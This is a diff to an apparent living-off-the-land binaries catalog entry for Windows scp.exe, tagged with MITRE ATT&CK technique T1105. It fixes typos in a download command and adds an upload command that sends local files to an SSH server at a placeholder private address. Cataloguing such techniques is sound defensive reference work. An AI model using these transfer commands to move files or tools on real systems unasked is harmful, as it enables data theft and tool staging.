@@ -12,9 +12,16 @@ Commands:
     MitreID: T1202
     OperatingSystem: Windows 10, Windows 11
   - Command: "scp <ssh-username>@192.168.187.128:<path_of_file_to_download> <path_to_save_file>"
-    Description: Download file with scp.exe from am SSH server
-    Usecase: Use scp.exe to download file from an SSH server. If needed, you will be asked to submit a password as well.
+    Description: Download file with scp.exe from an SSH server
+    Usecase: Use scp.exe to download file from an SSH server. If needed, you will be asked to submit a password for the SSH session.
     Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+  - Command: "scp <path_of_local_file_to_upload> <ssh-username>@192.168.187.128:<path_to_save_file>"
+    Description: Upload file with scp.exe to an SSH server
+    Usecase: Use scp.exe to Upload file from the local machine to remote SSH server. If needed, you will be asked to submit a password for the SSH session.
+    Category: Upload
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10, Windows 11
